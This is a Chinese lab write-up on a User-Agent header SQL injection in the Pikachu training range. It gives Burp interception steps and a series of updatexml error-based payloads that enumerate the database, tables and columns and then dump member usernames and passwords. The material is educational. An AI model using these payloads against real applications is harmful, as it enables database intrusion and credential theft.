---
title: Pikachu http header注入实验报告
date: 2026-10-29
category: Web安全
tags: [SQL注入, http header注入, 报错注入, burp抓包, Pikachu]
---
## 一、实验环境

靶场：Pikachu漏洞平台
地址：127.0.0.1/pikachu/vul/sqli/sqli_header.php
漏洞类型：HTTP头注入（User-Agent注入）
原理：后端直接把请求头里的User-Agent内容拼进SQL语句，没有过滤，产生注入。
后端逻辑：记录访问者的UA、ip、时间，写入数据库。属于INSERT类型，没有页面回显，用updatexml报错注入。
## 二、底层SQL猜想
INSERT INTO httpinfo (ua,ip,time) VALUES ('$useragent','$ip','$time');
注入点：User-Agent 请求头的值，被单引号包裹，闭合符号：'

## 三、实验步骤

1. 进入 http header注入 页面，页面提示：your ip is:xxx

2. 打开Burp，开启代理，Intercept: on，刷新页面抓包

3. 抓到请求包，找到 User-Agent: 这一行
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/xxx
4. 修改User-Agent，在原有UA后面追加payload（注意前面有单引号闭合）
模板：在UA末尾加上 ' and updatexml(1,concat(0x7e,database(),0x7e),1) and '
完整payload（直接复制替换User-Agent）
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 ' and updatexml(1,concat(0x7e,database(),0x7e),1) and '
✅ 拼接后SQL：
INSERT INTO httpinfo (ua,ip,time) VALUES ('Mozilla/xxx ' and updatexml(1,concat(0x7e,database(),0x7e),1) and '','127.0.0.1','2026-xx-xx');
• 第一个'：闭合原来ua的前单引号

• and updatexml(...)：触发报错注入

• 末尾and '：平衡引号，语法正常，不要用#注释！ 用#会破坏后面的字段
依次使用的payload

1. 查询数据库名
' and updatexml(1,concat(0x7e,database(),0x7e),1) and '
2. 查询所有表
' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and '
3. 查询member表字段
' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='member'),0x7e),1) and '
4. 脱库拿账号密码
' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,pw) from member),0x7e),1) and '
5. 修改完UA，放行数据包，查看Response响应包，报错信息就在响应里面！浏览器页面不会变，和delete注入一样。

## 四、补充说明

• 注入点除了User-Agent，这个靶场也支持Cookie注入（部分版本），原理一样，修改Cookie头。

• 本质还是INSERT注入，往表里插入数据，不能union select，只能报错注入

• 坑：不要写#注释，会把后面的字段注释掉，SQL直接语法报错，拿不到数据；用and '闭合引号。

## 五、漏洞危害

1. 攻击者篡改HTTP请求头带入注入语句，读取数据库敏感数据；

2. 可以插入恶意数据，污染日志表；

3. 高权限下读取服务器文件。

